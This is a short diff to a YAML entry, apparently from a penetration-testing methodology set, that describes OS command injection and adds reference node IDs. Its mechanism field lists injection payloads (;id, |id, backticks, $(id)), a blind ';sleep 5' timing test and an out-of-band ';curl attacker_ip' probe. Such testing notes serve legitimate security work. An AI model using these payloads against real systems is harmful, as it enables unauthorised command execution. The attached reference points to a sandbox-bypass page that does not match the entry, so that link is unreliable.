@@ -14,7 +14,17 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: 'Inject OS commands via semicolon, pipe, backtick, $(), or newline. Test:
-  ;id, |id, `id`, $(id). Blind: ;sleep 5 and measure response time. Out-of-band: ;curl
-  attacker_ip.'
+mechanism: 'Inject OS commands via semicolon, pipe, backtick, $(), or newline. Test: ;id, |id, `id`, $(id). Blind: ;sleep
+  5 and measure response time. Out-of-band: ;curl attacker_ip.'
 hacktricks_ref: generic-methodologies-and-resources/python/bypass-python-sandboxes/README.md
+references:
+  ocd_mindmap_node_ids:
+  - 0b10ee3f64
+  - 373088015a
+  - 6d35eaef9e
+  - c7d98ef65b
+  - d1c46fd9d6
+  - dfac822d81
+  - e884c75a71
+  - ea4da78fb5
+  - eace48af16
